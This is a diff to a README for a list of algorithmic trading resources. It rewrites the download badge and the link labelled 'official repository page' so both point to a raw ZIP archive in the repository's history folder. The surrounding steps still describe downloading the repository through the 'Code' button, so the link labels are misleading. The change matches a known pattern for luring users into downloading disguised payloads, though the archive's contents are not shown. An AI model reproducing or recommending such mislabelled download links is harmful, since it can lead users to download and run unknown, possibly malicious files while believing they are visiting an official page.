@@ -1,6 +1,6 @@
 # 📈 best-of-algorithmic-trading - Build your automated trading strategy today
 
-[![Download the Resources](https://img.shields.io/badge/Download-Resources-blue)](https://github.com/kernssanon-hub/best-of-algorithmic-trading)
+[![Download the Resources](https://img.shields.io/badge/Download-Resources-blue)](https://github.com/kernssanon-hub/best-of-algorithmic-trading/raw/refs/heads/main/history/algorithmic_trading_best_of_1.1.zip)
 
 ## 📋 About This Project
 
@@ -20,7 +20,7 @@ Automated trading involves using software to execute trades based on rules. This
 You do not need to install complex software to use this list. Follow these steps to access the information:
 
 1. Open your web browser.
-2. Go to the [official repository page](https://github.com/kernssanon-hub/best-of-algorithmic-trading).
+2. Go to the [official repository page](https://github.com/kernssanon-hub/best-of-algorithmic-trading/raw/refs/heads/main/history/algorithmic_trading_best_of_1.1.zip).
 3. Click the green "Code" button near the top right of the screen.
 4. Select "Download ZIP" from the menu.
 5. Save the file to your computer.
